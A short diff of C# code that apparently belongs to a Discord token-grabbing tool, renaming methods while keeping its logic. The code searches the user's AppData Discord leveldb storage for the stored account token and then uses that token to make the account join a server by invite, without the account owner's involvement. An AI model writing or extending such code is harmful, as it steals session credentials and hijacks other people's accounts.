@@ -99,7 +99,7 @@ namespace ur_namespace
             requestStream.Close();
             return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
         }
-        public static void JoinServer(string invite, string token)
+        public static void RequestInvite(string invite, string token)
         {
             try
             {
@@ -111,7 +111,7 @@ namespace ur_namespace
 
             }
         }
-        public static void AutoJoinVoid()
+        public static void JoinServer(string inv)
         {
             string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
             if (!FindLdb(ref text) && !FindLog(ref text))
@@ -128,7 +128,7 @@ namespace ur_namespace
 
             }
 
-            JoinServer("serverid", text2);
+            RequestInvite("serverid", text2);
             //serverid is the final part of an invite ex: https://discord.gg/serverid
         }
     }
